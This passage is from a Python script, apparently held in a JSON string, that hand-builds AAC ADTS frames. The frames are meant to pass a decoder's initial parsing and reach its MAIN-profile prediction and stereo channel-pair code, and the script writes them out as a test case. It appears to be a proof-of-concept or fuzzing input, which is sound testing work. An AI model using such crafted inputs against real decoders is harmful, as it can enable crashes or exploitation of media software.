 buffer fullness MSB (5 bits)\n    buffer_fullness = 0x7FF  # VBR\n    byte6 = ((frame_length & 0x7) << 5) | ((buffer_fullness >> 6) & 0x1F)\n    \n    # Seventh byte:\n    # ADTS buffer fullness LSB (6 bits)\n    # Number of raw data blocks (2 bits) - 0 means 1 block\n    byte7 = ((buffer_fullness & 0x3F) << 2) | 0\n    \n    adts_header = bytes([sync_and_flags1, sync_and_flags2, byte3, byte4, byte5, byte6, byte7])\n    \n    # Raw data block payload\n    # Start with ID_CPE (0x1) element\n    # Element format: 3-bit ID + 4-bit tag\n    # ID_CPE = 0x1 (001 in binary)\n    # Tag = 0 (0000 in binary)\n    # Combined: 0010 0000 = 0x20\n    \n    payload = bytearray()\n    \n    # ID_CPE with tag 0\n    payload.append(0x20)  # 001 (ID_CPE) + 00000 (tag=0, partial)\n    \n    # Add minimal CPE data structure\n    # Common window: 0 (1 bit)\n    # ICS info for both channels\n    # We need enough data to pass initial parsing but trigger the prediction path\n    \n    # Minimal ICS structure (simplified)\n    # This creates a basic channel pair structure\n    for _ in range(40):\n        payload.append(0x00)\n    \n    # End with ID_END (0x7)\n    # ID_END = 0x7 (111 in binary) + padding\n    payload.append(0xE0)  # 111 (ID_END) + 00000\n    \n    # Pad to match frame_length\n    while len(payload) < (frame_length - 7):\n        payload.append(0x00)\n    \n    return adts_header + bytes(payload)\n\n# Generate the test case\nwith open(output_path, "wb") as f:\n    frame = generate_adts_frame()\n    f.write(frame)\n    # Write multiple frames to ensure decoding starts\n    f.write(frame)\n\nprint(f"Generated AAC ADTS testcase at {output_path}")\nprint(f"- Profile: MAIN (triggers prediction code)")\nprint(f"- Channel config: Stereo (triggers CPE processing)")\nprint(f"- File size: {len(frame) * 2} bytes")\n'}
